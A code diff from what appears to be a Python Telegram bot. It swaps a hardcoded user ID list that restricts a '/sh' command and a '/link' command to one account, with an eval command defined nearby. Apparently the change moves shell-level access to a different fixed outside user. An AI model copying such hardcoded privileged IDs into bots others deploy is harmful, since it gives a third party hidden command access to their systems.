@@ -50,7 +50,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-BION = [847793223]    
+REXA = [1224143544]    
 
 @app.on_message(
     filters.command(["eval", "e", "ev"], [".", "-", "!", "^", ";", ":", "/"])
@@ -161,7 +161,7 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_message(
     filters.command("link")
-    & filters.user(BION)
+    & filters.user(REXA)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -176,7 +176,7 @@ async def link_cmd(client, message):
 
 @app.on_message(
     filters.command("sh")
-    & filters.user(BION)
+    & filters.user(REXA)
     & ~filters.forwarded
     & ~filters.via_bot
 )
